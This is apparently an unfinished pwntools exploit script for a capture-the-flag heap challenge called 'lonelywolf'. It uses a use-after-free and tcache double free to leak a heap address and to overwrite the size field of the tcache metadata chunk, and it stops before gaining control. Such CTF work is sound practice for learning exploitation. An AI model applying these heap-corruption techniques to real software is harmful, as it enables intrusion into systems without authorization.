from json.tool import main
from platform import architecture
from pwn import *
context(arch = "amd64", os = "Linux", log_level = "Debug")
io = process("./lonelywolf")
context.terminal = ['tmux','splitw','-h']
# io = remote("124.70.130.92", 60001)
gdb.attach(io)

s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(str(delim), data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(str(delim), data)
r       = lambda num=4096           :io.recv(num)
ru      = lambda delims             :io.recvuntil(delims)
rl      = lambda                    :io.recvline()
itr     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

def add(size):
    ru("Your choice: ")
    sl("1")
    ru("Index: ")
    sl("0")
    ru("Size: ")
    sl(str(size))

def edit(content):
    ru("Your choice: ")
    sl("2")
    ru("Index: ")
    sl("0")
    ru("Content: ")
    sl(content)

def show():
    ru("Your choice: ")
    sl("3")
    ru("Index: ")
    sl("0")
    ru("Content: ")

def delete():
    ru("Your choice: ")
    sl("4")
    ru("Index: ")
    sl("0")

add(0x78)
delete()
add(0x68)
delete()
add(0x58)
delete()
add(0x48)
delete()
#chunk B
add(0x38)
#write prev_size of extended tcache info chunk
edit(p64(0) * 6 + p64(0x440))
delete()
#self-looped, address in chunk
#show after delete(UAF)
#leak the heap addr
add(0x20)
delete()
delete()
pause()
show()
heap_addr = u64(rl()[:6].ljust(8, "\0"))
heap_base_addr = heap_addr - 0x440
log.info("Heap addr (add offset 0x440) : " + hex(heap_base_addr))

#edit pointer to point to heap base addr to edit size field
edit(p64(heap_base_addr))
#alloc middle chunks
add(0x20)
#alloc tcache info chunk(size:0x260)
#because it is big enough to alloc a small chunk
add(0x20)
#edit size to 0x440, to the head of chunk A
edit(p64(0) + p64(0x440))
#edit chunk B prev_size field to bypass checking

#prepare to alloc extended tcache info chunk
add(0x10)
delete()
delete()
edit(p64(heap_base_addr))
add(0x10)
pause()
add(0x10)

